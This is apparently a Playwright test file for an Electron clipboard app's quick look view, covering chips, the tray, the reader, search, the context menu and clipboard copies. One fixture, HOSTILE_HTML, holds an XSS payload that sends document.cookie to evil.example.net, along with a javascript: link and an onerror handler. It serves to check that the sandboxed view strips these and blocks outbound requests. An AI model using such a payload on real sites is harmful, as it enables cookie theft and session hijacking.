import { test, expect, _electron as electron, ElectronApplication, Page } from '@playwright/test';
import { resolve } from 'path';

/**
 * The clips window after step 2 of the quick look plan: chips, pins, the tray, the reader,
 * the search bar, the context menu, and the sandboxed rendered view. Workers stay at 1:
 * every case reads and writes the real OS clipboard.
 */

const appPath = resolve(__dirname, '../out/main/index.js');
const UNIQUE = Date.now().toString(36);

const IP_A = '203.0.113.42';
const IP_B = '198.51.100.7';
const EMAIL = `mreyes-${UNIQUE}@example.com`;
const CLIP_ONE = `alert ${UNIQUE}: failed logins from ${IP_A} for ${EMAIL}`;
const CLIP_TWO = `second source ${UNIQUE}: ${IP_B} seen overnight`;

const HOSTILE_HTML =
  `<p><b>Invoice ${UNIQUE}</b> is overdue. <a href="javascript:alert(1)">Pay now</a></p>` +
  '<script>fetch("https://evil.example.net/x?c=" + document.cookie)</script>' +
  '<img src="https://evil.example.net/pixel.gif" onerror="alert(2)">' +
  '<iframe src="https://evil.example.net/"></iframe><style>body{display:none}</style>';

async function launchApp(): Promise<{ app: ElectronApplication; window: Page }> {
  // Linux only: Playwright's basic password store leaves safeStorage without encryption
  const app = await electron.launch({
    args: [appPath],
    env: { ...process.env, CLIPLESS_PLAINTEXT_STORAGE: '1' },
  });
  const window = await app.firstWindow();
  await window.waitForSelector('#root > *');
  return { app, window };
}

async function seedConfig(window: Page): Promise<void> {
  await window.evaluate(async () => {
    const api = (window as any).api;
    for (const t of await api.searchTermsGetAll()) await api.searchTermsDelete(t.id);
    for (const t of await api.quickToolsGetAll()) await api.quickToolsDelete(t.id);
    for (const t of await api.templatesGetAll()) await api.templatesDelete(t.id);
    await api.searchTermsCreate('IP', '(?<ip>\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b)');
    await api.searchTermsCreate('Email', '(?<email>[\\w.+-]+@[\\w-]+\\.[\\w.]+)');
    await api.quickToolsCreate('VirusTotal', 'https://www.virustotal.com/gui/ip-address/{ip}', [
      'ip',
    ]);
    await api.templatesCreate('IP block', 'Block {ip} reported by {email}');
  });
}

async function copyText(app: ElectronApplication, window: Page, text: string): Promise<void> {
  await app.evaluate(async ({ clipboard }, t) => {
    clipboard.writeText(t);
  }, text);
  await window.waitForTimeout(800);
}

const rowWith = (window: Page, text: string) =>
  window.locator('[data-testid="clip-row"]', { hasText: text }).first();

test.describe('Quick look', () => {
  let app: ElectronApplication;
  let window: Page;

  test.beforeAll(async () => {
    const result = await launchApp();
    app = result.app;
    window = result.window;
    await seedConfig(window);
    await copyText(app, window, CLIP_ONE);
    await expect(rowWith(window, `alert ${UNIQUE}`)).toBeVisible({ timeout: 10000 });
  });

  test.afterAll(async () => {
    await app.close();
  });

  test('a clip with an IP and an email shows two chips and two dots', async () => {
    const row = rowWith(window, `alert ${UNIQUE}`);
    await expect(row.locator('[data-key]')).toHaveCount(2, { timeout: 10000 });
    await expect(row.locator(`[data-key="ip|${IP_A}"]`)).toBeVisible();
    await expect(row.locator(`[data-key="email|${EMAIL}"]`)).toBeVisible();
    await expect(row.getByTestId('group-dots').locator('i')).toHaveCount(2);
    await expect(window.getByTestId('tray')).toBeHidden();
  });

  test('clicking a chip pins it: the tray appears with one group and a tool button', async () => {
    const row = rowWith(window, `alert ${UNIQUE}`);
    await row.locator(`[data-key="ip|${IP_A}"]`).click();
    const tray = window.getByTestId('tray');
    await expect(tray).toBeVisible();
    await expect(tray.locator('[data-testid^="tray-group-"]')).toHaveCount(1);
    await expect(tray.getByTestId('tray-group-ip')).toContainText('VirusTotal');
    await expect(tray.getByTestId('tray-group-ip')).not.toContainText('x2');
    await expect(tray.getByTestId('open-all')).toHaveText('Open all (1 tab)');
    // the chip now looks pinned and the row never entered edit
    await expect(row.locator(`[data-key="ip|${IP_A}"]`)).toHaveAttribute('data-pinned', 'true');
    await expect(row.locator('textarea')).toHaveCount(0);
  });

  test('pinning a second IP gives the tool a multiplier and Open all the exact count', async () => {
    await copyText(app, window, CLIP_TWO);
    const row = rowWith(window, `second source ${UNIQUE}`);
    await row.locator(`[data-key="ip|${IP_B}"]`).click();
    const tray = window.getByTestId('tray');
    await expect(tray.getByTestId('tray-group-ip')).toContainText('VirusTotal x2');
    await expect(tray.getByTestId('open-all')).toHaveText('Open all (2 tabs)');
    // the tray says what a template still needs
    await expect(tray.getByTestId('template-pills')).toContainText('needs email');
  });

  test('the eye and Space open the reader, Esc closes it and focus is on the row', async () => {
    const row = rowWith(window, `alert ${UNIQUE}`);
    await row.hover();
    await row.getByTestId('eye').click();
    const reader = window.getByTestId('quick-look');
    await expect(reader).toBeVisible();
    await expect(reader.getByTestId('ql-content').locator(`[data-key="ip|${IP_A}"]`)).toBeVisible();
    await expect(reader.getByTestId('ql-side')).toContainText('2 values');
    await window.keyboard.press('Escape');
    await expect(reader).toBeHidden();
    await expect
      .poll(() => window.evaluate(() => document.activeElement?.getAttribute('data-testid')))
      .toBe('clip-row');
    await expect
      .poll(() => window.evaluate(() => document.activeElement?.textContent))
      .toContain(`alert ${UNIQUE}`);

    await window.keyboard.press('Space');
    await expect(reader).toBeVisible();
    await window.keyboard.press('Escape');
    await expect(reader).toBeHidden();
  });

  test('Up and Down walk the clips without closing the reader', async () => {
    const row = rowWith(window, `second source ${UNIQUE}`);
    await row.hover();
    await row.getByTestId('eye').click();
    const reader = window.getByTestId('quick-look');
    await expect(reader.getByTestId('ql-clip-number')).toHaveText('Clip 1');
    await window.keyboard.press('ArrowDown');
    await expect(reader.getByTestId('ql-clip-number')).toHaveText('Clip 2');
    await expect(reader.getByTestId('ql-content')).toContainText(`alert ${UNIQUE}`);
    await window.keyboard.press('ArrowUp');
    await expect(reader.getByTestId('ql-clip-number')).toHaveText('Clip 1');
    await expect(reader).toBeVisible();
    await window.keyboard.press('Escape');
    await expect(reader).toBeHidden();
  });

  test('with a filter typed, the reader says "n / m filtered"', async () => {
    await window.getByTestId('search-button').click();
    const input = window.locator('#clip-search-input');
    await expect(input).toBeFocused();
    await input.fill(UNIQUE);
    await expect(window.getByTestId('search-count')).toContainText('2 of');
    await window.keyboard.press('ArrowDown');
    await expect
      .poll(() => window.evaluate(() => document.activeElement?.getAttribute('data-testid')))
      .toBe('clip-row');
    await window.keyboard.press('Space');
    const reader = window.getByTestId('quick-look');
    await expect(reader.getByTestId('ql-position')).toHaveText('1 / 2 filtered');
    await window.keyboard.press('Escape');
    await expect(reader).toBeHidden();
    // Esc on the input clears the text, a second hides the bar
    await input.focus();
    await window.keyboard.press('Escape');
    await expect(input).toHaveValue('');
    await window.keyboard.press('Escape');
    await expect(window.getByTestId('search-bar')).toBeHidden();
  });

  test('right-click row 2 shows Quick look and the submenu; row 1 has Lock and Delete disabled', async () => {
    await rowWith(window, `alert ${UNIQUE}`).click({ button: 'right' });
    await expect(window.getByTestId('menu-quick-look')).toBeVisible({ timeout: 3000 });
    await expect(window.getByTestId('menu-quick-look')).not.toHaveAttribute(
      'aria-disabled',
      'true'
    );
    await expect(window.getByTestId('menu-fill-clip-template')).toBeVisible();
    await expect(window.getByTestId('menu-lock')).not.toHaveAttribute('aria-disabled', 'true');
    await window.keyboard.press('Escape');

    await rowWith(window, `second source ${UNIQUE}`).click({ button: 'right' });
    await expect(window.getByTestId('menu-lock')).toHaveAttribute('aria-disabled', 'true');
    await expect(window.getByTestId('menu-delete')).toHaveAttribute('aria-disabled', 'true');
    await expect(window.getByTestId('menu-lock')).toContainText('row 1 is the live clipboard');
    await window.keyboard.press('Escape');
    await expect(window.getByTestId('clip-context-menu')).toBeHidden();
  });

  test('the status bar quick look button opens the reader on row 1', async () => {
    await window.getByTestId('quick-look-button').click();
    const reader = window.getByTestId('quick-look');
    await expect(reader).toBeVisible();
    await expect(reader.getByTestId('ql-clip-number')).toHaveText('Clip 1');
    await window.keyboard.press('Escape');
    await expect(reader).toBeHidden();
  });
});

test.describe.serial('Quick look — clipboard writes', () => {
  let app: ElectronApplication;
  let window: Page;

  test.beforeAll(async () => {
    const result = await launchApp();
    app = result.app;
    window = result.window;
    await seedConfig(window);
    await copyText(app, window, CLIP_ONE);
    await expect(rowWith(window, `alert ${UNIQUE}`)).toBeVisible({ timeout: 10000 });
    await copyText(app, window, CLIP_TWO);
    await expect(rowWith(window, `second source ${UNIQUE}`)).toBeVisible({ timeout: 10000 });
  });

  test.afterAll(async () => {
    await app.close();
  });

  test('the number cell copies the clip and toasts', async () => {
    const row = rowWith(window, `alert ${UNIQUE}`);
    await row.getByTestId('row-number').click();
    await expect(window.getByTestId('toast').first()).toContainText(
      'Copied clip 2 to the clipboard'
    );
    const clipboardText = await app.evaluate(async ({ clipboard }) => clipboard.readText());
    expect(clipboardText).toBe(CLIP_ONE);
  });

  test('c in the reader copies the clip and toasts', async () => {
    const row = rowWith(window, `second source ${UNIQUE}`);
    await row.hover();
    await row.getByTestId('eye').click();
    await expect(window.getByTestId('quick-look')).toBeVisible();
    await window.keyboard.press('c');
    await expect(window.getByTestId('toast').first()).toContainText(
      'Copied clip 1 to the clipboard'
    );
    const clipboardText = await app.evaluate(async ({ clipboard }) => clipboard.readText());
    expect(clipboardText).toBe(CLIP_TWO);
    await window.keyboard.press('Escape');
  });

  test('a ready template pill copies the generated text and toasts the values used', async () => {
    const row = rowWith(window, `alert ${UNIQUE}`);
    await row.locator(`[data-key="ip|${IP_A}"]`).click();
    await row.locator(`[data-key="email|${EMAIL}"]`).click();
    const pill = window
      .getByTestId('tray')
      .locator('[data-state="ready"]', { hasText: 'IP block' });
    await expect(pill).toBeVisible();
    await pill.click();
    const toast = window.getByTestId('toast').first();
    await expect(toast).toContainText('Copied "IP block" to the clipboard');
    await expect(toast).toContainText(`ip ${IP_A}`);
    const clipboardText = await app.evaluate(async ({ clipboard }) => clipboard.readText());
    expect(clipboardText).toBe(`Block ${IP_A} reported by ${EMAIL}`);
  });
});

test.describe('Quick look — rendered html', () => {
  let app: ElectronApplication;
  let window: Page;

  test.beforeAll(async () => {
    const result = await launchApp();
    app = result.app;
    window = result.window;
  });

  test.afterAll(async () => {
    await app.close();
  });

  test('the hostile clip renders as text in a sandboxed frame and no request leaves it', async () => {
    const requests: string[] = [];
    window.on('request', (request) => requests.push(request.url()));
    const frameRequests: string[] = [];
    app.on('window', (page) => page.on('request', (request) => frameRequests.push(request.url())));

    await app.evaluate(async ({ clipboard }, html) => {
      clipboard.write({ html });
    }, HOSTILE_HTML);
    await window.waitForTimeout(1000);

    const row = rowWith(window, `Invoice ${UNIQUE}`);
    await expect(row).toBeVisible({ timeout: 10000 });
    await expect(row).toContainText('html');
    await expect(row).not.toContainText('<script');

    await row.hover();
    await row.getByTestId('eye').click();
    const reader = window.getByTestId('quick-look');
    await expect(reader).toBeVisible();
    await reader.getByTestId('ql-view-rendered').click();
    const frame = reader.getByTestId('ql-frame');
    await expect(frame).toBeVisible({ timeout: 5000 });
    await expect(frame).toHaveAttribute('sandbox', '');
    await expect(frame).toHaveAttribute('referrerpolicy', 'no-referrer');
    const srcdoc = await frame.getAttribute('srcdoc');
    expect(
      srcdoc?.startsWith(
        '<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy"'
      )
    ).toBe(true);
    expect(srcdoc).not.toContain('<script');
    expect(srcdoc).not.toContain('evil.example.net');
    await expect(reader.getByTestId('ql-side')).toContainText('removed:');

    // the frame's document is the sanitised one and nothing in it ran or loaded
    const frameHandle = await window.$('[data-testid="ql-frame"]');
    const inner = await frameHandle!.contentFrame();
    expect(inner).not.toBeNull();
    await expect.poll(() => inner!.locator('body').textContent()).toContain(`Invoice ${UNIQUE}`);
    expect(await inner!.locator('script').count()).toBe(0);
    expect(await inner!.locator('img').count()).toBe(0);
    await window.waitForTimeout(1000);
    expect(requests.filter((u) => u.includes('evil.example.net'))).toEqual([]);
    expect(frameRequests.filter((u) => u.includes('evil.example.net'))).toEqual([]);
    await window.keyboard.press('Escape');
  });
});
